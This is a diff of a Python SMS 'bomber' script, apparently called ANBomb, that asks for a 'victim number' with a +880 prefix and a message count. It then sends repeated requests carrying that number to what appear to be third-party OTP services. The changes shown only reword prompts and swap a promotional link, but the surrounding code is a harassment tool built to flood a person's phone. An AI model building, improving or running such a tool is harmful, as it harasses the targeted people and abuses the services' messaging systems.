@@ -133,8 +133,8 @@ try:
  print("\n\033[1;37m[\033[1;32m#\033[1;37m]"+"\033[1;32m Connected ")
 except (requests.ConnectionError, requests.Timeout) as exception:
  print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31m😢 Your Internet Connection Is Poor !")
-number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
-amo=int(input(c+"\n[ AMMOUNT ] : "+w))
+number=input(f"{c}\n[ ENTER YOUR VICTIM NUMBER ] :{w} +880")
+amo=int(input(c+"\n[ ENTER AMMOUNT ] : "+w))
 xak(f"\n\n\t\t   {w}<{r}/{w}> {g}BE ETHICAL MATE ;) {w}<{r}/{w}>\n\n")
 input(f"\t\t\t{r}Press Enter....")
 os.system("clear")
@@ -300,7 +300,7 @@ headers20["Content-Type"] = "application/json"
 
 data20 = '{"phone": "0'+number+'"}'
 
-os.system("xdg-open https://facebook.com/groups/1247616299128920/")
+os.system("xdg-open https://github.com/Termux-lover-AhesanCoxiT")
 
 # Request
 print(f"""\n{ran}\033[1;31m
@@ -374,6 +374,6 @@ for i in range(amo):
 
 else:
         print(c+"\n\n\n\t\t[💣] THANKS FOR USING THIS TOOL [💣]")
-        input(g+"\n\t\t\tEnter For Continue")
+        input(g+"\n\t\t\tPress Enter For Continue")
         os.system("clear")
         os.system("python ANBomb.py")
